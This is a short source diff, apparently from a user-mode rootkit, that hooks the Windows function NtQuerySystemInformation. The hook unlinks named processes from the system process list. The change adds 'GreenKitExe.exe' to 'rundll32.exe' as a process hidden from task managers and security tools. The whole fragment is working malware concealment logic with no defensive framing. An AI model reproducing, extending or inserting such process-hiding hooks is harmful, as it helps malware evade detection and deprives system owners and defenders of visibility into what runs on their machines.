@@ -4,6 +4,7 @@
 #include "hooking.h"
 
 const wchar_t* m_ProcessToHide = L"rundll32.exe";
+const wchar_t* m_ProcessToHide2 = L"GreenKitExe.exe";
 
 TD_NtQuerySystemInformation oldNtQuery;
 TD_NtQuerySystemInformation hookNtQuery;
@@ -54,7 +55,8 @@ NTSTATUS WINAPI NewNtQuerySystemInformation(
             pCurrent = pNext;
             pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-            if (!wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide, pNext->ImageName.Length))
+            if (!wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide, pNext->ImageName.Length)
+                || !wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide2, pNext->ImageName.Length))
             {
                 if (0 == pNext->NextEntryOffset)
                 {
